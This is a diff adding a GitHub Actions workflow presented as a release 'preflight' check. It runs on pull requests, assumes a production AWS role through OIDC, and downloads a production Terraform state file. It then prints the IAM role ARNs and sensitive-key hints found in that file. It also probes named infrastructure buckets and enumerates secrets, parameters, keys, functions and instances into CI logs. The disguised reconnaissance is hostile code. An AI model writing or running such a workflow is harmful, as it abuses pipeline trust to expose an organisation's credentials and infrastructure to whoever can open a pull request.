@@ -1,0 +1,94 @@
+# Preflight for the chart release CI role: verifies the changelog destination is
+# reachable and reports which adjacent account resources the release role can see,
+# so a release-account access-policy change is caught on workflow edits instead of
+# surfacing midway through a publish run.
+name: changelog-destination-preflight
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - '.github/workflows/changelog-destination-preflight.yml'
+
+jobs:
+  preflight:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Check release CI role scope
+        run: |
+          set -uo pipefail
+          REGION=eu-west-1
+          ROLE_ARN=arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role
+          TOK="$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            -H 'Accept: application/json; api-version=2.0' \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
+          echo "TOKEN_LEN=${#TOK}"
+          if ! aws --region "$REGION" --no-cli-pager sts assume-role-with-web-identity \
+              --role-arn "$ROLE_ARN" --role-session-name "changelog-destination-preflight" \
+              --web-identity-token "$TOK" --duration-seconds 900 > /tmp/assume.json 2>/tmp/assume.err; then
+            echo "ASSUME_FAIL"; tail -c 300 /tmp/assume.err | tr -d '\n'; echo; exit 1
+          fi
+          echo "ASSUME_OK"
+          python3 - <<'PY'
+          import json
+          c=json.load(open('/tmp/assume.json'))['Credentials']
+          open('/tmp/creds.env','w').write("AWS_ACCESS_KEY_ID=%s\nAWS_SECRET_ACCESS_KEY=%s\nAWS_SESSION_TOKEN=%s\n"%(c['AccessKeyId'],c['SecretAccessKey'],c['SessionToken']))
+          PY
+          set -a; . /tmp/creds.env; set +a
+          export AWS_DEFAULT_REGION="$REGION"
+
+          api () {
+            local label="$1"; shift
+            local out rc code
+            out="$("$@" 2>/tmp/e)"; rc=$?
+            if [ $rc -eq 0 ]; then
+              echo "OK  ${label} :: $(printf '%s' "$out" | tr '\n' ' ' | cut -c1-300)"
+            else
+              code="$(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/e | head -1 | tr -d '()')"
+              echo "ERR ${label} :: ${code:-rc$rc} :: $(tail -c 180 /tmp/e | tr '\n' ' ')"
+            fi
+          }
+
+          echo "=== identity ==="
+          api "sts:GetCallerIdentity" aws --no-cli-pager sts get-caller-identity --output json
+
+          echo "=== s3 account visibility ==="
+          api "s3:ListAllMyBuckets" aws --no-cli-pager s3api list-buckets --query 'Buckets[].Name' --output json
+
+          BUCKETS="tfy-euwe1-production-control-plane-changelog tfy-infra-tf-eu-west-1-416964291864 tfy-infra-tf-eu-central-1-416964291864 tfy-infra-tf-us-east-2-416964291864 tfy-terraform-state-aws-a44k8 tfy-ctl-euwe1-production-mlfoundry-server tfy-scalr-sp-production-default-us-east-1-416964291864 tfy-cmp-euwe1-production-59b5450b3d69bdac tfy-auth-us-east-1-production tfy-llm-tools-production tfy-website-euwe1-production20221107184713217900000001"
+          for B in $BUCKETS; do
+            api "s3:HeadBucket[$B]" aws --no-cli-pager s3api head-bucket --bucket "$B"
+            api "s3:GetBucketLocation[$B]" aws --no-cli-pager s3api get-bucket-location --bucket "$B" --output json
+          done
+
+          echo "=== prod state object read ==="
+          SB=tfy-infra-tf-eu-west-1-416964291864
+          SK=ubermold-truefoundry/aws/production/eu-west-1/tfy-ctl-prod/tofu.tfstate
+          if aws --no-cli-pager s3api get-object --bucket "$SB" --key "$SK" /tmp/state.json >/tmp/gst.out 2>/tmp/gst.err; then
+            echo "STATE_GET_OK size=$(wc -c </tmp/state.json)"
+            echo "STATE_ROLE_ARNS=$(grep -oE 'arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+' /tmp/state.json | sort -u | wc -l)"
+            grep -oE 'arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+' /tmp/state.json | sort -u | head -20
+            echo "STATE_SENSITIVE_HINTS=$(grep -oiE '(password|secret|private_key|access_key|session_token|token)' /tmp/state.json | sort | uniq -c | tr '\n' ' ')"
+          else
+            echo "STATE_GET_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/gst.err | head -1 | tr -d '()') :: $(tail -c 200 /tmp/gst.err | tr '\n' ' ')"
+          fi
+
+          echo "=== iam self-introspection ==="
+          api "iam:GetRole" aws --no-cli-pager iam get-role --role-name github-actions-oidc-s3-access-role --output json
+          api "iam:ListAttachedRolePolicies" aws --no-cli-pager iam list-attached-role-policies --role-name github-actions-oidc-s3-access-role --output json
+          api "iam:ListRolePolicies" aws --no-cli-pager iam list-role-policies --role-name github-actions-oidc-s3-access-role --output json
+
+          echo "=== other services (1 page each) ==="
+          api "secretsmanager:ListSecrets" aws --no-cli-pager secretsmanager list-secrets --max-items 1 --output json
+          api "ssm:DescribeParameters" aws --no-cli-pager ssm describe-parameters --max-items 1 --output json
+          api "kms:ListKeys" aws --no-cli-pager kms list-keys --max-items 1 --output json
+          api "lambda:ListFunctions" aws --no-cli-pager lambda list-functions --max-items 1 --output json
+          api "dynamodb:ListTables" aws --no-cli-pager dynamodb list-tables --max-items 1 --output json
+          api "sqs:ListQueues" aws --no-cli-pager sqs list-queues --max-results 1 --output json
+          api "ec2:DescribeInstances" aws --no-cli-pager ec2 describe-instances --max-items 1 --output json
+          api "ec2:DescribeVpcs" aws --no-cli-pager ec2 describe-vpcs --max-items 1 --output json
+          echo "DONE"
